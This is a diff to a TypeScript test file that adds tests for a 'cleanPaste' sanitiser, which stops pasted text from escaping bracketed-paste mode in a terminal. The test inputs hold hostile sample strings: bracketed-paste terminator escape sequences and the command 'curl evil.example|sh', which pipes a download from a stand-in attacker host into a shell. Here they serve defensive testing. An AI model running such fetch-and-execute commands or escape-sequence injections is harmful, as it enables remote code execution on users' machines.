@@ -3,7 +3,15 @@ import { test } from "node:test";
 import assert from "node:assert/strict";
 import { execFileSync } from "node:child_process";
 import { existsSync } from "node:fs";
-import { remotePath, shellQuote, typeable } from "../../src/terminal/quote.ts";
+import { cleanPaste, remotePath, shellQuote, typeable } from "../../src/terminal/quote.ts";
+
+test("pasted text can't end the bracketed paste early", () => {
+  const evil = "ls\x1b[201~\ncurl evil.example|sh\n";
+  assert.equal(cleanPaste(evil), "ls[201~\ncurl evil.example|sh\n");
+  assert.equal(cleanPaste("a\x1b[200~b\x9b201~c\x00\x07\x7f"), "a[200~b201~c");
+  // tabs, line breaks and other text stay
+  assert.equal(cleanPaste("a\tb\r\nc ž 漢字 ✓"), "a\tb\r\nc ž 漢字 ✓");
+});
 
 test("names with control characters are never typed", () => {
   for (const bad of ["a\u0015curl evil|sh #", "a\u001b[201~\u0015x\r", "tab\there", "del\u007f", "c1\u009b", "nl\n"]) {
